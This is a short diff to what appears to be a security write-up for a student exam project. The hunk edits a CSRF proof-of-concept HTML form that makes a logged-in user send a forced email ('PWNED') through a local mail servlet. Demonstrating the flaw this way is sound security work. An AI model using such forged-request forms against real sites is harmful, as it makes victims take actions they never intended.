@@ -86,7 +86,7 @@ In this example `user1@gmail.com` is forced to email `user2@gmail.com`.
 ```html
 <form id="submitMail" class="form-resize" action="http://localhost:8080/exam-project/SendMailServlet"
       method="post">
-    <input type="hidden" name="email" value="user1@gmail.com">
+    <input type="hidden" name="sender" value="user1@gmail.com">
     <input class="hidden" name="receiver" placeholder="Receiver" required="" value="user2@gmail.com">
     <input class="hidden" name="subject" placeholder="Subject" required="" value="PWNED">
     <input class="hidden" name="body" placeholder="Body" required="" value="Forced message">
